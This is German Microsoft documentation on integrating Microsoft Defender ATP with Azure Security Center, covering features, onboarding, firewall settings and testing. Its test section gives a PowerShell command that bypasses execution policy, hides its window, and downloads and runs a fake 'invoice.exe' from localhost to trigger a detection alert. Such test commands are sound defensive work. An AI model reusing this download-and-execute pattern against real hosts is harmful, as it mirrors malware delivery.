---
title: Microsoft Defender Advanced Threat Protection – Azure Security Center
description: Dieses Dokument stellt die Integration von Azure Security Center und Microsoft Defender Advanced Threat Protection vor.
services: security-center
documentationcenter: na
author: memildin
manager: rkarlin
ms.service: security-center
ms.devlang: na
ms.topic: conceptual
ms.tgt_pltfrm: na
ms.workload: na
ms.date: 09/24/2019
ms.author: memildin
ms.openlocfilehash: 46b9fe5c6a038aa98cf8df64c40bf8ea1747efec
ms.sourcegitcommit: 609d4bdb0467fd0af40e14a86eb40b9d03669ea1
ms.translationtype: HT
ms.contentlocale: de-DE
ms.lasthandoff: 11/06/2019
ms.locfileid: "73663609"
---
# <a name="microsoft-defender-advanced-threat-protection-with-azure-security-center"></a>Microsoft Defender Advanced Threat Protection mit Azure Security Center

Azure Security Center erweitert das Angebot an Cloudworkloadschutz-Plattformen um die Integration in [Microsoft Defender Advanced Threat Protection](https://www.microsoft.com/microsoft-365/windows/microsoft-defender-atp) (ATP).
Diese Änderung bietet umfassende Funktionen für Endpoint Detection and Response (EDR). Durch die ATP-Integration in Microsoft Defender können Sie Anomalien erkennen. Sie können auch erweiterte Angriffe auf Serverendpunkte erkennen und darauf reagieren, die von Azure Security Center überwacht werden.

## <a name="microsoft-defender-atp-features-in-security-center"></a>Microsoft Defender ATP-Features in Security Center

Wenn Sie Microsoft Defender ATP verwenden, erhalten Sie Folgendes:

- **Erweiterte Erkennungssensoren für Sicherheitsverletzungen**: Microsoft Defender ATP-Sensoren für Windows-Server erfassen eine breite Palette von verhaltensbezogenen Signalen.

- **Auf Analysen basierende, cloudgesteuerte Erkennung von Sicherheitsverletzungen:** : Microsoft Defender ATP nimmt eine schnelle Anpassung an sich ändernde Bedrohungen vor. Das Produkt verwendet fortschrittliche Analysen und Big Data. Microsoft Defender ATP wird durch die Leistungsfähigkeit von Intelligent Security Graph mit Signalen aus Windows, Azure und Office verstärkt, um unbekannte Bedrohungen zu erkennen. Das Produkt stellt aussagekräftige Warnmeldungen zur Verfügung und ermöglicht eine schnelle Reaktion.

- **Informationen zu Bedrohungen**: Microsoft Defender ATP generiert Warnungen, wenn es Angriffstools, -techniken und -verfahren erkennt. Das Produkt verwendet Daten, die von Microsoft-Bedrohungsspezialisten und Sicherheitsteams generiert werden, ergänzt durch Informationen von Partnern.

Die folgenden Funktionen sind ab sofort in Azure Security Center verfügbar:

- **Automatisiertes Onboarding**: Der Microsoft Defender ATP-Sensor wird automatisch für Windows-Server aktiviert, die in Azure Security Center integriert sind.

- **Zentralisierte Benutzeroberfläche**: Die Azure Security Center-Konsole zeigt Microsoft Defender ATP-Warnungen an.

- **Detaillierte Untersuchung des Computers**: Azure Security Center-Kunden können die Microsoft Defender ATP-Konsole verwenden, um den Umfang einer Sicherheitsverletzung durch eine detaillierte Untersuchung zu erkennen.

![Azure Security Center zeigt eine Liste der Warnungen und allgemeine Informationen zu jeder Warnung an.](media/security-center-wdatp/image1.png)

Verwenden Sie Microsoft Defender ATP, um weitere Informationen zu erhalten. Microsoft Defender ATP zeigt zusätzliche Informationen wie die Warnprozessstruktur und den Ereignisgraph an. Sie können auch eine detaillierte Computerzeitachse verwenden, die jedes Verhalten über einen historischen Zeitraum von bis zu sechs Monaten anzeigt.

![Microsoft Defender ATP-Seite mit Detailinformationen zu einer Warnung](media/security-center-wdatp/image3.png)

## <a name="platform-support"></a>Plattformunterstützung

Microsoft Defender ATP in Security Center unterstützt die Erkennung unter Windows Server 2016, 2012 R2 und 2008 R2 SP1. Für virtuelle Azure-Computer benötigen Sie ein Abonnement im Standard-Tarif. Für Nicht-Azure-VMs benötigen Sie den Standard-Tarife nur auf der Arbeitsbereichsebene.

> [!NOTE]
> Wenn Sie Azure Security Center zum Überwachen von Servern verwenden, wird automatisch ein Microsoft Defender ATP-Mandant erstellt, und die Microsoft Defender ATP-Daten werden standardmäßig in Europa gespeichert. Wenn Sie Ihre Daten an einen anderen Standort verschieben möchten, müssen Sie den Microsoft-Support kontaktieren, um den Mandanten zurückzusetzen.Wenn Sie Ihre Daten an einen anderen Ort verschieben müssen, müssen Sie den Microsoft-Support kontaktieren, um den Mieter zurückzusetzen. Die Serverendpunktüberwachung, die diese Integration verwendet, wurde für Office 365-GCC-Kunden deaktiviert.

## <a name="onboarding-servers-to-security-center"></a>Integrieren von Servern in Azure Security Center 

Klicken Sie unter der Integration von Servern in Microsoft Defender ATP auf **Go to Azure Security Center to onboard servers** (Zum Azure Security Center wechseln, um Server zu integrieren), um Server in Security Center zu integrieren.

1. Wählen Sie im Bereich **Onboarding** einen Arbeitsbereich aus (oder erstellen Sie einen Arbeitsbereich), in dem die Daten gespeichert werden sollen. <br>
2. Wenn nicht alle Arbeitsbereiche angezeigt werden, kann dies auf fehlende Berechtigungen zurückzuführen sein. Stellen Sie daher sicher, dass Ihr Arbeitsbereich auf den Tarif „Standard“ von Azure Security Center eingestellt ist. Weitere Informationen finden Sie unter [Upgrade auf den Standard-Tarif von Azure Security Center für erhöhte Sicherheit](security-center-pricing.md).
    
3. Wählen Sie **Server hinzufügen** aus, um Anweisungen zum Installieren von Microsoft Monitoring Agent anzuzeigen. 

4. Nach der Integration können Sie die Computer unter **Compute und Apps** überwachen.

   ![Integrieren von Computern](media/security-center-wdatp/onboard-computers.png)

## <a name="enable-microsoft-defender-atp-integration"></a>Aktivieren der Microsoft Defender ATP-Integration

Wählen Sie **Security Center** > **Preise & Einstellungen** aus, und klicken Sie auf Ihr Abonnement, um anzuzeigen, ob die ATP-Integration von Microsoft Defender aktiviert ist.
Hier können Sie die Integrationen anzeigen, die zurzeit aktiviert sind.

  ![Einstellungsseite von Azure Security Center Threat Detection mit aktivierter Microsoft Defender ATP-Integration](media/security-center-wdatp/enable-integrations.png)

- Wenn Sie die Server bereits in die Standardebene von Azure Security Center integriert haben, müssen Sie keine weiteren Maßnahmen ergreifen. Azure Security Center integriert die Server automatisch in Microsoft Defender ATP. Das Onboarding kann bis zu 24 Stunden dauern.

- Wenn Sie die Server noch nie in die Standardebene von Azure Security Center integriert haben, integrieren Sie sie wie gewohnt in Azure Security Center.

- Gehen Sie folgendermaßen vor, wenn Sie die Server über Microsoft Defender ATP integriert haben:
  - Verwenden Sie die Anleitungen in der Dokumentation zum [Aufheben der Integration von Servercomputern](https://go.microsoft.com/fwlink/p/?linkid=852906).
  - Integrieren Sie diese Server in Azure Security Center.

## <a name="access-to-the-microsoft-defender-atp-portal"></a>Zugreifen auf das Microsoft Defender ATP-Portal

Befolgen Sie die Anweisungen unter [Zuweisen von Benutzerzugriff auf das Portal](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/assign-portal-access).

## <a name="set-the-firewall-configuration"></a>Festlegen der Firewallkonfiguration

Wenn Sie einen Proxy oder eine Firewall verwenden, der bzw. die anonymen Datenverkehr blockiert, stellen Sie sicher, dass anonymer Datenverkehr zulässig ist, da ein Microsoft Defender ATP-Sensor aus dem Systemkontext eine Verbindung herstellt. Befolgen Sie die Anweisungen unter [Aktivieren des Zugriffs auf Windows Defender ATP-Dienst-URLs im Proxyserver](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/configure-proxy-internet#enable-access-to-microsoft-defender-atp-service-urls-in-the-proxy-server).

## <a name="test-the-feature"></a>Testen des Features

So generieren Sie eine unbedenkliche Microsoft Defender ATP-Testwarnung:

1. Verwenden Sie Remotedesktop, um auf eine Windows Server 2012 R2-VM oder eine Windows Server 2016-VM zuzugreifen. Öffnen Sie ein Eingabeaufforderungsfenster.

2. Kopieren Sie an der Eingabeaufforderung den folgenden Befehl, und führen Sie ihn aus. Das Eingabeaufforderungsfenster wird automatisch geschlossen.

    ```
    powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden (New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\test-WDATP-test\\invoice.exe'); Start-Process 'C:\\test-WDATP-test\\invoice.exe'
    ```

   ![Ein Eingabeaufforderungsfenster mit dem oben gezeigten Befehl](media/security-center-wdatp/image4.jpeg)

3. Wenn der Befehl erfolgreich ist, wird Ihnen eine neue Warnung im Azure Security Center-Dashboard und im Microsoft Defender ATP-Portal angezeigt. Die Anzeige dieser Warnung kann einige Minuten dauern.

4. Um die Warnung in Security Center zu überprüfen, navigieren Sie zu **Sicherheitswarnungen** > **Verdächtige PowerShell-Befehlszeile**.

5. Wählen Sie im Untersuchungsfenster den Link aus, um zum Microsoft Defender ATP-Portal zu navigieren.

## <a name="next-steps"></a>Nächste Schritte

- [Von Azure Security Center unterstützte Features und Plattformen](security-center-os-coverage.md)
- [Festlegen von Sicherheitsrichtlinien in Azure Security Center](tutorial-security-policy.md): Erfahren Sie, wie Sie Sicherheitsrichtlinien für Ihre Azure-Abonnements und -Ressourcengruppen konfigurieren.
- [Verwalten von Sicherheitsempfehlungen in Azure Security Center](security-center-recommendations.md): Erfahren Sie, wie Empfehlungen Ihnen beim Schutz Ihrer Azure-Ressourcen helfen.
- [Überwachen der Sicherheitsintegrität in Azure Security Center](security-center-monitoring.md): Hier erfahren Sie, wie Sie die Integrität Ihrer Azure-Ressourcen überwachen.
